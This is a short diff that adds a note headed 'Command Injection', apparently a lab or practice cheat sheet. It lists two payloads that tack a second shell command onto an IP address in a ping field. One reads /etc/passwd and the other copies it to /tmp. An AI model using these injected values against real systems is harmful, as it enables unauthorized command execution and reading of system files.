@@ -1,0 +1,13 @@
+Command Injection
+
+
+##ping
+
+192.168.1.211; cat /etc/passwd
+
+
+##File copy to tmp
+
+192.168.1.211; cat /etc/passwd | tee /tmp/passwd
+
+
